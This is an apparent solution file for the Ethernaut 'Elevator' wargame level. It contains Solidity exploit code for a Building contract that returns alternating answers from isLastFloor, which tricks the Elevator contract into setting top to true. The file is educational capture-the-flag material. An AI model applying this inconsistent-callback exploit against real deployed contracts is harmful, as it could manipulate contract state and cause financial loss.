/*

This example illustrates the nuances involved when a function uses just an implementer interface without knowing the actual function definition behind it

The isLastFloor function in Elevator seems to never reach the top (thus make top=true), but some tricks can force it into doing so

We will create a new contract Building, which will call the goTo function in Elevator, this contract implements the isLastFloor function defined in the interface above Elevator contract

*/

// Get the Elevator contract address from console
contract.address;
// Use this to populate addr field in solidity


/* === Solidity code
// Deployed and Tested in Remix
// Deploy Building contract and call reachTop function with any parameter value of choice
// The contract flips the answer for every call made to isLastFloor function

===

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Building {

  address ee = addr;
  Elevator e = Elevator(ee);

  bool c = true;

  function isLastFloor(uint) external returns (bool) {
    c = c ? false : true;
    return c;
  }

  function reachTop(uint y) public {
      e.goTo(y);
  }
}

*/
